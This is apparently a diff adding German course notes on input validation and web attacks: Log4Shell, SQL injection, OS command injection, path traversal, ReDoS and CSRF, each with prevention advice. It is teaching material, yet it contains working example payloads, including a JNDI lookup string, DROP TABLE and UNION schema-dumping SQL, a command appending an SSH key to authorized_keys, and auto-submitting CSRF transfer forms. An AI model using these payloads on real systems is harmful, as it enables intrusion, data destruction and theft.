@@ -821,16 +821,6 @@ s _ c r _ t     _ e c _ e t     s e _ r e _
   - Von Adi Shamir
   - "Shamir's Secret Sharing"
 
-## Links
-
-- [Crypto 101](https://www.crypto101.io/)
-
-## Fragen für morgen (und die weiteren Tage ;-))
-
-- Digitale Souveränität / Self Custody
-- Wie geht man mit kompromittierten Schlüsseln um?
-
-
 ## OAuth 2.0
 
 - Authorisierungsframework
@@ -1127,3 +1117,397 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4
 ### Third Party Initiated Login
 
 - Von außen auf einen Client/eine Anwendung linken und direkt einen Authentifizierungsprozess starten
+
+
+
+
+
+
+# Daten Validieren
+
+## 3 Grundpfeiler von Security
+
+- Integrität "Das System tut das, für was es entworfen wurde"
+- Vertraulichkeit "Das System gibt Daten nur an berechtigte Parteien weiter"
+- Verfügbarkeit "Das System muss die Aufgaben erledigen können"
+
+
+## Injections
+
+- SQL Injections
+- Cross Site Scripting
+- (Buffer Overflows)
+- OS Command Injection
+- Path Traversal
+
+## Log4Shell
+
+Bug in der Library Log4j
+
+```java
+package net.codejava;
+ 
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.bind.annotation.RequestHeader;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+ 
+@RestController
+public class SpringBootRESTController {
+
+    private static final Logger logger = LogManager.getLogger("SpringBootHelloWorld");
+
+    @RequestMapping("/")
+    String home(@RequestHeader(value = "User-Agent") String userAgent) {
+        logger.info("Got request from user agent: {}", userAgent);
+        return "Hello World Spring Boot!";
+    }
+
+}
+```
+
+```
+${java:vm}
+```
+
+```
+${jndi:ldap://log4shell.huntress.com:1389/7c5dba6d-c6de-4aa1-9c1e-0f0979f86e23}
+```
+
+## Was sind Injection-Attacken?
+Attacken, bei denen nutzerkontrollierter Input nicht (ausreichend) bereinigt wird und in einem Kontext verwendet wird, in dem man davon ausgeht, dass der Input sicher ist.
+
+## Von Schwachstelle zur Attacke
+Meistens braucht es eine Aneinanderreihung von Schwachstellen, um erfolgreich eine Attacke auszuführen.
+
+## SQL-Injection
+- Nutzerdaten in ein SQL-Query verpacken
+- Ein Angreifer verändert Struktur bzw. Semantik der Query
+
+- String concatenation
+- Ohne Escapen
+- Ohne Prepared Statements
+
+```sql
+SELECT * FROM users WHERE username = "${username}" AND password = "${password}"
+```
+
+```ts
+
+const username = 'mgartner" --';
+const password = "letmein123";
+```
+
+```sql
+SELECT * FROM users WHERE username = "mgartner" --" AND password = "letmein123"
+```
+
+```ts
+
+const username = 'mgartner"; DROP TABLE users --';
+const password = "letmein123";
+```
+
+```sql
+SELECT * FROM users WHERE username = "mgartner"; DROP TABLE users --" AND password = "letmein123"
+```
+
+Funktioniert nicht, JOIN muss vor WHERE stehen
+```sql
+SELECT * FROM products WHERE name LIKE '%' JOIN users ON 
+```
+
+```
+a%' UNION SELECT 1, 1, TABLE_SCHEMA, TABLE_NAME FROM information_schema.tables; #
+
+a%' UNION SELECT 1, TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns; #
+```
+
+### Generelles vorgehen
+1. Herausfinden, ob die Anwendung generell anfällig für SQL-Injection ist. (z.B. indem man `'";` eingibt)
+2. Herausfinden auf welchem DBMS man sich bewegt.
+3. Auslesen von System-Tabellen, um Tabellennamen, Spaltennamen, usw. herauszufinden.
+4. Mit dieser Information eine schädliche Abfrage konstruieren.
+
+### Wie verhindert man SQL-Injections?
+- SQL Queries sollten _niemals_ per String Building
+- User(kontrollierter)-Input _immer_ bereinigen
+  - Am besten nur eine kleine Menge an Inputs überhaupt erlauben
+- Wenn möglich: Kein Raw-SQL als API verwenden. Stattdessen strukturierte Schnittstellen wie REST, SOAP, gRPC
+
+### Was ist User-kontrollierter Input?
+- Alles was aus Eingabemasken kommt
+- Alles was über eine (öffentliche?) API kommt
+- Dateien die hochgeladen werden
+- Daten aus dem Filesystem
+- Daten aus Datenbanken
+- Protokoll-Spezifika beachten
+  - HTTP-Header
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## OS Command Injection
+- Kommandos werden auf Kommandozeile ausgeführt
+- Durch nutzerkontrollierten Input wird die Struktur bzw. Semantik des Kommandos verändert
+
+### Shell basics
+
+Verkettung von Kommandos:
+- `;` Ausführung hinteinander
+- `&&` Ausführung bei Erfolg
+- `||` Ausführung bei Fehler
+
+`ping -c3 google.de; echo "mykey" >> ~/.ssh/authorized_keys`
+
+### Vermeidung
+- Nicht die Shell als API missbrauchen
+- Input bereinigen
+  - Die meisten Shells sind allerdings sehr mächtig, daher kann das schwierig sein
+
+### Schaden verhindern
+- Firewalls korrekt konfigurieren
+- Sandboxing und Container
+- Zugriffsrechte einschränken
+
+
+## Path traversal
+- Durch Nutzerkontrollierten Input wird ein Dateisystempfad manipuliert
+
+### Vermeidung
+- Niemals Pfade per String Building konstruieren
+- Bereinigen des Inputs
+  - z.B. `/` entfernen -> Abhängig vom OS
+  - Kann schwierig werden, denn Dateisysteme können eigen sein
+- Überprüfen der Dateipfade vor der Verwendung
+
+```js
+await fs.promises.readFile('public/' + fileName)
+await fs.promises.readFile('public/' + '../../../')
+
+path.resolve('public/' + '../../../') => /home/nh/code
+// /home/nh/code/injections/server/public/
+```
+
+- Statt nutzerkontrollierten Input in Dateipfade zu stecken: Nutzerinput zu generierten Dateipfade zuordnen
+
+```
+Nutzer: ./Bilder/cat.jpeg
+Server: hash(./Bilder/cat.jpeg) => 123323525deaf24213
+        Lade /files/123323525deaf24213
+```
+
+## ReDoS
+- Regex Denial of Service
+- DoS: Ressourcen vergeuden bzw. blockieren, damit das System nicht mehr verfügbar i
+
+### Funktionsweise
+Um Regex auszuführen, werden NFAs (Nichtdeterministische Finite Automaten) konstruiert. Durch Eigenkanten werden die NFAs immer komplexer, so kommt es zu einer exponentiell steigenden Ausführungszeit.
+
+```js
+const searchRe = /Ashton/i
+```
+
+```
+([a-zA-Z]+)* [a-zA-Z]*
+```
+
+### Vermeidung
+- Input bereinigen
+- Ausführungszeit beschränken
+
+
+
+
+
+
+
+
+## Cross Site Scripting (XSS)
+- Man injiziert einen (Script-) Tag?
+- Man manipuliert das HTML, das an einen (anderen) Nutzer ausgeliefert wird.
+
+- Eingabe simulieren
+  - z.B. Nach Passwort fragen
+- Externe Ressourcen laden
+- Eingaben abfangen
+- Daten extrahieren
+  - per LocalStorage
+  - per SessionStorage
+
+Wir bekommen per XSS Zugriff auf den Client (Browser). Das System bzw. dessen Daten liegen aber auf dem Server.
+
+
+## CSRF / Session Riding
+Imitieren eines Nutzers durch Ausnutzen einer bestehenden Session, aus einem Browser heraus.
+
+Man bringt den Browser dazu eine Anfrage an den Server zu stellen, der Browser sendet dabei das bestehende Cookie mit. Wie bringt man den Browser dazu?
+
+Durch ein manipuliertes Bild
+
+```html
+<img src="https://mybank.com/transfer-funds?to=hacker&amount=10000" width="0" height="0" />
+```
+
+Durch einen speziell präparierten Link 
+
+```html
+<a href="https://mybank.com/transfer-funds?to=hacker&amount=10000">See my pictures ;-)</a>
+```
+
+Helfen dann POST requests?
+
+### Same Origin Policy
+
+Grundsätzlich sind Requests über Origin-Grenzen hinweg verboten.
+
+Einschränkungen:
+- GET-Requests sind grundsätzlich erlaubt
+- POST-Requests
+  - nur bei bestimmten Content-Types
+- Per CORS (Cross Origin Resource Sharing) aufgeweichte Requests
+
+Man ist "einigermaßen sicher" bei:
+- Allem was nicht POST, GET, HEAD ist
+- POST-Request mit Content-Type `application/json`
+
+
+Helfen aber jetzt POST requests?
+
+```html
+<body onload="document.forms[0].submit()">
+<form action="https://mybank.com/transfer-funds" method="POST">
+    <input type="hidden" name="to" value="hacker"/>
+    <input type="hidden" name="amount" value="10000"/>
+</form>
+</body>
+```
+
+### Vermeidung
+
+- Synchronizer/CSRF-Token verwenden
+    - Es wird beim Ausliefern des Frontends _auf dem Server_ ein zufälliges Token erzeugt.
+    - Bei jedem weiteren Request müssen session Token und synchronizer Token zueinander passen
+
+Ein legitimes Formular (gesendet vom legitimen Backend):
+
+```html
+<body>
+<form action="https://mybank.com/transfer-funds" method="POST">
+    <input type="hidden" name="to" value="hacker"/>
+    <input type="hidden" name="amount" value="10000"/>
+    <input type="hidden" name="csrfToken" value="t0934tu30tt33t345tg">
+</form>
+</body>
+```
+
+Ein nicht legitimes Formular hat keine Möglichkeit das Token zu bekommen.
+
+```html
+<body>
+<form action="https://mybank.com/transfer-funds" method="POST">
+    <input type="hidden" name="to" value="hacker"/>
+    <input type="hidden" name="amount" value="10000"/>
+    <input type="hidden" name="csrfToken" value="???">
+</form>
+</body>
+```
+
+badSite.html
+```html
+<script>
+    // Funktioniert nicht aufgrund von SOP
+    const response = await fetch('https://mybank.com');
+    const body = await response.text();
+
+    const csrfToken = parseFrontend(body);
+
+    // Use CSRF token to send request
+</script>
+```
+
+http://myybank.com
+```html
+<script>
+    const response = await fetch(
+        'https://mybank.com/transfer-funds',
+        {
+            method: 'POST',
+            body: {
+                to: 'hacker',
+                amount: 100000
+                sessionToken: sessionStorage.get('sessionToken')
+            }
+        }
+    );
+</script>
+```
+
+- CORS restriktiv konfigurieren
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## Links
+
+- [Crypto 101](https://www.crypto101.io/)
+
+## Fragen für die weiteren Tage
+
+- Digitale Souveränität / Self Custody
+- Wie geht man mit kompromittierten Schlüsseln um?
